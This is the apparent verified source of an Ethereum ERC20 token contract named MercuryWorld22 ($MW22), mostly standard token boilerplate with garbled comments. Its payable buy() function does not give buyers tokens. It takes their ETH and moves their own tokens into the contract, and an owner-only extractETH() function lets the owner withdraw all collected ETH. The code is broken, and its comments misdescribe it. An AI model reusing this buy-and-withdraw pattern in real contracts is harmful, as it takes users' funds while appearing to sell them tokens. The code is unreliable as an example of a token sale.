/**
 *Submitted for verification at Etherscan.io on 2022-07-04
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IERC20 {
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  *  Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);
  
  function allowance(address _owner, address spender) external view returns (uint256);
  
  function approve(address spender, uint256 amount) external returns (bool);
  
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  
  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*

 */
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.

  function _msgSender() internal view returns (address ) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}



contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   *  Initializes the contract setting the deployer as the initial owner.
   */
  constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   *  Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   *  Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ZEBRO is Context, IERC20, Ownable {

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor() {
    _name = "MercuryWorld22";
    _symbol = "$MW22";
    _decimals = 18;
    _totalSupply = 100000000 *10**18;
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  /**
 *  Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  //return the token symbol
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  //return the token name
  function name() external view returns (string memory) {
    return _name;
  }

  //return the token name totalsupply of erc20 display
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

//balance of the account
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

 //trasfer token
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
// transfer to contract with eth

   function buy() public payable {
    _transfer(_msgSender(), address(this), msg.value);
  
  }


//contract eth to wallet transfer 
  function extractETH() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

 // to erc20 spender can use a limit  of usage token
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

 //to user can use  erc20 token 
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

//tranfer given from address and to is receipient and amount
 
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), (_allowances[sender][_msgSender()]) - (amount));
    return true;
  }

 //its can increase the erc20 allowance
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, (_allowances[_msgSender()][spender]) + (addedValue));
    return true;
  }
  //its can decrese the erc20 allowance

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, (_allowances[_msgSender()][spender]) - (subtractedValue));
    return true;
  }
  

  //to transfer the that time null value to display te require message and 
  // sender balance will be less and recipient value will be increser the amount
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _balances[sender] = _balances[sender] - (amount);
    _balances[recipient] = _balances[recipient] + (amount);
    emit Transfer(sender, recipient, amount);
  }
 

//to give a null value to show this message
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}